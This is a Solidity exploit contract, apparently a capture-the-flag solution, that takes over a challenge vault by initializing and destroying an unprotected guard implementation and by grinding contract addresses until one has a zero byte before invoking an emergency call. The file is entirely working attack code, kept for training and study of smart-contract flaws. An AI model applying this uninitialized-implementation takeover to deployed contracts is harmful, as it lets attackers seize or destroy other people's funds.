pragma solidity 0.4.16;

import "./SetupVault.sol";

contract Caller {
    function doit(Vault vault) {
        vault.emergencyCall(msg.sender, new bytes(0));
    }
}

contract ExploitVault {
    address public owner;

    SetupVault public setup;

    function ExploitVault(address _setup){
        setup = SetupVault(_setup);
    }

    function part1() external {
        GuardRegistry registry = setup.registry();
        Guard guard = Guard(registry.implementations(registry.defaultImplementation()));
        guard.initialize(Vault(address(this)));
        guard.cleanup();
    }
    
    function part2() external {
        Caller caller;
        while (true) {
            caller = new Caller();
            if (bytes20(address(caller))[15] == 0) {
                break;
            }
        }
        caller.doit(setup.vault());
    }
    
    function guard() external view returns (address) {
        return msg.sender;
    }
    
    function() external {
        owner = address(0);
    }
}